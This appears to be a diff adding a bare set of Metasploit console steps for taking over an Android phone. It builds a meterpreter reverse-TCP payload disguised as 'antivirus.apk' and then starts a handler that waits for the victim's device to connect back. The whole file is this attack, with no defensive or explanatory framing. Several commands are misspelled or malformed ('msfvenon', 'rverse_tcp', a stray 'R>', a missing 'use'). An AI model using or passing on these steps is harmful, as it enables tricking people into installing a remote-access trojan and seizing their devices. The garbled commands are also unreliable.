@@ -1,0 +1,11 @@
+msf6>msfvenon -p android/meterpreter/reverse_tcp LHOST=< SORCE IP ADDRESS > LPORT = 1020 R>antivirus.apk
+
+
+#step 2
+#open next tab msf console
+msf6>payload android/meterpreter/rverse_tcp LHOST <YOUR IP ADDRESS > LPORT 1020
+
+msf6>multi/handler
+msf6>set lport 1020
+msf6>set lhost <your sourse ip address>
+msf6>exploit
